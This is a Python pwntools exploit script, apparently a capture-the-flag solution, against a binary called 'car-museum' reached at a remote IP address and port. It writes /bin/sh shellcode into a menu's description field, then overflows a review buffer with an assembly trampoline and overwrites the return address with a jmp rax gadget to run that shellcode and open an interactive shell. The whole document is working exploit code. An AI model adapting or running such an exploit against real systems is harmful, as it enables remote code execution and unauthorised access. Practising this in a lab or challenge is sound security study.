from pwn import *

# Setup context for correct assembly generation
exe = context.binary = ELF('./car-museum')
# Connect to the process (Replace with remote() for the actual target)
p = remote('46.225.117.62', 30016)
log.info("=== STEP 1: Planting the Shellcode ===")

# Create the standard /bin/sh shellcode (approx 48 bytes)
shellcode = asm(shellcraft.sh())

# REMOVED the NOP sled so the payload size is safely under 63 bytes!
malicious_description = shellcode

# Navigate the menu to edit Cat 0
p.sendlineafter(b"Choice: ", b"3")
p.sendlineafter(b"editing? ", b"0")
p.sendlineafter(b"description: ", malicious_description)
log.info("=== STEP 2: The Trampoline & Pivot ===")

# Write our hopscotch trampoline
# 1. Jump over the first 8 bytes
# 2. Fill the gap with NOPs (Index 7 gets corrupted here, but we don't care!)
# 3. Safely execute our math and jump
trampoline = asm('''
    jmp skip
    .space 6, 0x90
skip:
    sub rax, 788
    jmp rax
''')

# Pad the trampoline to exactly 20 bytes to reach the Return Address
payload = trampoline.ljust(20, b'A')

# Overwrite the Return Address with the jmp rax gadget
JMP_RAX = 0x40118c
payload += p64(JMP_RAX)

# Trigger the exit and send the payload
p.sendlineafter(b"Choice: ", b"4")
p.sendlineafter(b"[y/n]: ", b"y")
p.sendlineafter(b"Review: ", payload)

log.success("Exploit fired! Crossing fingers...")
p.interactive()
